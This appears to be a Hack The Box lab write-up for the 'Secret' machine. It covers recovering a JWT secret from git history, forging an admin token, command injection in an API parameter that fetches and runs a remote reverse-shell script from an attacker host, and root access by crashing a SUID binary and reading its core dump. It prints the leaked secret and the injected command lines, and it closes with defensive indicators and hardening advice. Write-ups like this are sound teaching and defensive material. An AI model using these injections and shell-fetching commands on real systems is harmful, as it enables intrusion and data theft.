---
layout: writeup
title: "Secret"
platform: HTB
os: "Linux"
date: 2026-04-04
techniques: ["Git History Analysis", "JWT Forgery", "Command Injection", "SUID Binary Exploitation", "Core Dump Analysis"]
cve: []
description: "Leaked JWT secret in git history enables admin JWT forgery, leading to command injection RCE and privilege escalation via SUID binary core dump memory extraction."
---

# Secret - Technical Report

> **Platform:** Hack The Box \
> **Difficulty:** `Easy` \
> **Date:** 2026-04-04 \
> **Author:** 0N1S3C \
> **Scope:** Authorized lab environment only

---

## 0. Executive Summary

> The "Secret" machine hosted a Node.js Express API with a publicly
> accessible `.git` repository. The JWT signing secret was recoverable
> from git commit history, allowing an attacker to forge admin tokens.
> The admin-only `/api/logs` endpoint was vulnerable to OS command
> injection via unsanitized input passed to `git log`, granting remote
> code execution. Privilege escalation was achieved by abusing a custom
> SUID binary (`/opt/count`) that reads privileged files - crashing it
> with SIGSEGV while it held root-owned file contents in memory produced
> a core dump from which the root flag was extracted. Immediate
> remediation should focus on rotating the JWT secret, sanitizing all
> user input passed to shell commands, and removing or restricting the
> SUID binary.

---

## 1. Introduction

This report documents the structured analysis and controlled exploitation
of the **"Secret"** machine on Hack The Box.

**Objectives:**
- Obtain user-level access
- Obtain root/system-level access

**Methodology:** Assessments follow the standardized approach defined
in `methodology.md`.

---

## 2. Attack Chain

> Source code review → Git history secret leak → JWT forgery → Command injection RCE → SUID core dump privesc

```
[Nmap] → [Source Code Download] → [Git History: JWT Secret] → [JWT Forgery → Admin Access] → [Command Injection → RCE as dasith] → [SUID /opt/count + SIGSEGV Core Dump → Root]
```

---

## 3. Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service detection |
| `curl` | API interaction, user registration, JWT auth |
| `git` | Commit history analysis, secret recovery |
| `jwt.io` | JWT decoding and forging |
| `nc` | Reverse shell listener |
| `python3 http.server` | Payload delivery |
| `strings` | Core dump analysis |
| `apport-unpack` | Crash file extraction |

---

## 4. Reconnaissance

### 4.1 Initial Network Scan

**Command:**
```bash
nmap -sC -sV 10.129.13.168 -Pn -p-
```

**Findings:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22 | SSH | OpenSSH 8.2p1 Ubuntu | Standard SSH |
| 80 | HTTP | nginx 1.18.0 | "DUMB Docs" - API documentation site |
| 3000 | HTTP | Node.js (Express) | Same application, backend directly exposed |

**Key Observations:**
- Both port 80 (nginx reverse proxy) and port 3000 (raw Express) serve the same application
- The site is an API documentation page titled "DUMB Docs"
- A downloadable source code archive was linked directly on the site

---

## 5. Service Enumeration

### 5.1 Web Enumeration - Source Code Analysis

The documentation site provided a direct download link to the application source:

```bash
wget http://secret.htb/download/files.zip
```

Unzipping revealed a full Node.js Express application **with its `.git` directory intact**.

**Key files identified:**
- `routes/auth.js` - User registration and login endpoints
- `routes/private.js` - Admin-only endpoints including `/priv` and `/logs`
- `routes/verifytoken.js` - JWT verification middleware using `process.env.TOKEN_SECRET`
- `.env` - Environment config (removed in a later commit)

**Source code review of `private.js` revealed two critical issues:**

1. **Weak authorization check** - Admin access is determined solely by checking if `name == 'theadmin'` in the JWT payload. No server-side role validation.

2. **Command injection in `/api/logs`** - User input is passed directly into a shell command without sanitization:
   ```javascript
   const getLogs = `git log --oneline ${file}`;
   exec(getLogs, (err, output) => { ... });
   ```

---

## 6. Initial Access

### 6.1 Vulnerability Identification

**Vulnerability 1: JWT Secret in Git History** \
**Location:** `.env` file, commit `de0a46b` \
**Reasoning:** The commit message "removed .env for security reasons" immediately signals that sensitive data existed in a prior commit. Checking out the earlier commit exposed the `TOKEN_SECRET`.

```bash
git log
# Commit 67d8da7: "removed .env for security reasons" - suspicious
git checkout de0a46b5107a2f4d26e348303e76d85ae4870934
cat .env
# DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
# TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
```

**Vulnerability 2: OS Command Injection** \
**Location:** `/api/logs?file=` parameter \
**Reasoning:** The `file` parameter is concatenated directly into a `git log --oneline ${file}` shell command with no sanitization, allowing arbitrary command execution via shell metacharacters.

### 6.2 Exploitation

**Step 1 - Register a user account:**

```bash
curl -H 'Content-Type: application/json' \
  http://secret.htb/api/user/register \
  --data '{"name":"0N1S3C","email":"0N1S3C@HTB.com","password":"<REDACTED>"}'
# Response: {"user":"0N1S3C"}
```

**Step 2 - Obtain a valid JWT:**

```bash
curl -H 'Content-Type: application/json' \
  http://secret.htb/api/user/login \
  --data '{"email":"0N1S3C@HTB.com","password":"<REDACTED>"}'
# JWT returned in auth-token header
```

Decoded JWT payload:
```json
{
  "_id": "69d135b93bcded0474f1ebf9",
  "name": "0N1S3C",
  "email": "0N1S3C@HTB.com",
  "iat": 1775318757
}
```

**Step 3 - Forge an admin JWT:**

Using the leaked `TOKEN_SECRET`, the JWT was re-signed with `"name": "theadmin"` - the only check required for admin access.

```bash
curl http://secret.htb/api/priv -H 'auth-token: <forged-jwt>'
# {"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}
```

**Step 4 - Command injection to confirm RCE:**

```bash
curl 'http://secret.htb/api/logs?file=;id' -H 'auth-token: <forged-jwt>'
curl 'http://secret.htb/api/logs?file=;cat+/home/dasith/user.txt' -H 'auth-token: <forged-jwt>'
```

**Step 5 - Reverse shell:**

Hosted a bash reverse shell script via Python HTTP server and triggered it through the command injection:

```bash
# Attacker: serve payload and listen
python3 -m http.server 80
nc -lvnp 4444

# Trigger via injection
curl 'http://secret.htb/api/logs?file=;curl+http://<attacker-ip>/shell.sh+|+bash' \
  -H 'auth-token: <forged-jwt>'
```

**Result:** Reverse shell obtained as `dasith`.

---

## 7. Lateral Movement

> N/A - Direct path from initial access (dasith) to privilege escalation.

---

## 8. Privilege Escalation

### 8.1 Local Enumeration

**Actions Performed:**
- [x] SUID binaries - `find / -perm -4000 2>/dev/null`
- [x] Core dump settings - `ulimit -c`
- [x] Source code review of `/opt/count`

**Key Findings:**
- `/opt/count` - Custom SUID binary, not a standard system tool
- Source code available at `/opt/code.c`
- `ulimit -c` returned `unlimited` - core dumps enabled
- The binary reads file contents into memory as root (SUID), then **drops privileges** before asking to save results
- After dropping privileges, it explicitly calls `prctl(PR_SET_DUMPABLE, 1)` - enabling core dumps even for a SUID process

### 8.2 Escalation Vector

**Vector:** SUID binary core dump memory extraction \
**Root Cause:** The `/opt/count` binary reads privileged files as root and holds their contents in memory. After dropping privileges, it re-enables core dumps via `prctl(PR_SET_DUMPABLE, 1)`. By crashing the process with SIGSEGV while it still holds the file contents, the kernel writes a core dump containing the privileged data - readable by the unprivileged user.

**Exploitation (requires two shells):**

Shell 1 - Run the SUID binary targeting a root-owned file:
```bash
/opt/count
# Enter: /root/root.txt
# Binary reads the file and displays stats
# Pauses at "Save results a file? [y/N]:" - DO NOT ANSWER
```

Shell 2 - Crash the process:
```bash
ps aux | grep count
kill -SIGSEGV <pid>
```

Shell 1 shows: `Segmentation fault (core dumped)`

Extract the flag from the crash dump:
```bash
cd /var/crash
apport-unpack _opt_count.1000.crash /dev/shm/unpacked
strings /dev/shm/unpacked/CoreDump
```

The root flag was visible in the core dump output alongside the binary's internal strings.

**Result:** Root flag obtained.

---

## 9. Findings Summary

| # | Finding | Severity | Location |
|---|---------|----------|----------|
| 1 | JWT signing secret exposed in git history | 🔴 Critical | `.git` history, `.env` file |
| 2 | OS command injection in admin endpoint | 🔴 Critical | `/api/logs?file=` parameter |
| 3 | Weak authorization - name-based admin check | 🟠 High | `routes/private.js` |
| 4 | Source code with `.git` directory publicly downloadable | 🟠 High | `/download/files.zip` |
| 5 | SUID binary with `PR_SET_DUMPABLE` enables core dump privesc | 🟠 High | `/opt/count` |
| 6 | Core dumps enabled system-wide for unprivileged users | 🟡 Medium | `ulimit -c unlimited` |

**Severity Scale:**
`🔴 Critical` → `🟠 High` → `🟡 Medium` → `🔵 Low` → `⚪ Info`

---

## 10. Defensive Considerations

### 10.1 Indicators of Compromise

- Unusual POST requests to `/api/user/register` from external IPs
- JWT tokens with `"name": "theadmin"` issued to non-admin accounts
- Shell metacharacters (`;`, `|`, `$()`) in `/api/logs?file=` query parameters
- HTTP requests from the server to external IPs (payload fetch)
- Unexpected crash files in `/var/crash/` for `/opt/count`
- SIGSEGV signals sent to `/opt/count` processes

### 10.2 Security Weaknesses

- Secrets committed to version control and only "removed" in a later commit - the history retains them permanently
- No input sanitization or parameterized execution for shell commands
- Authorization based on a self-asserted JWT claim rather than server-side role lookup
- SUID binary that explicitly re-enables core dumps after reading privileged data
- Source code archive distributed with full `.git` history

### 10.3 Hardening Recommendations

| Priority | Recommendation | Finding |
|----------|---------------|---------|
| Immediate | Rotate the JWT signing secret and invalidate all existing tokens | #1 |
| Immediate | Sanitize all user input passed to shell commands; use parameterized APIs instead of `exec()` | #2 |
| Short-term | Implement server-side role-based access control, not JWT claim checks | #3 |
| Short-term | Remove `.git` directory from distributed archives; use `git archive` for exports | #4 |
| Short-term | Remove `prctl(PR_SET_DUMPABLE, 1)` from the SUID binary; redesign to avoid holding privileged data in memory after privilege drop | #5 |
| Long-term | Use pre-commit hooks and secret scanning tools (e.g., `trufflehog`, `gitleaks`) to prevent secrets from entering version control | #1 |
| Long-term | Restrict core dump generation via `/proc/sys/kernel/core_pattern` and `sysctl` | #6 |

---

## 11. Lessons Learned

- **Git history is permanent.** Removing a file in a new commit does not erase it - `git log` and `git checkout` trivially recover anything ever committed. Secrets that touch a repo must be rotated immediately, not just deleted.
- **`kill` ≠ crash.** A plain `kill` sends SIGTERM, which triggers a clean exit - no core dump. To force a core dump, you need a signal that indicates abnormal termination: SIGSEGV, SIGBUS, or SIGABRT. This is the difference between "please stop" and "something went catastrophically wrong."
- **`prctl(PR_SET_DUMPABLE, 1)` is a deliberate security downgrade.** SUID binaries are non-dumpable by default for good reason. Re-enabling dumpability after reading privileged files creates a window where crashing the process leaks those files via the core dump.
- **Two-shell coordination is a core pentesting pattern.** Any exploit that requires interacting with a running process (race conditions, signal-based attacks, timing attacks) needs at least two shells - one to run the target, one to manipulate it.

---

*End of Report*
*Classification: Public - flags and sensitive values omitted*
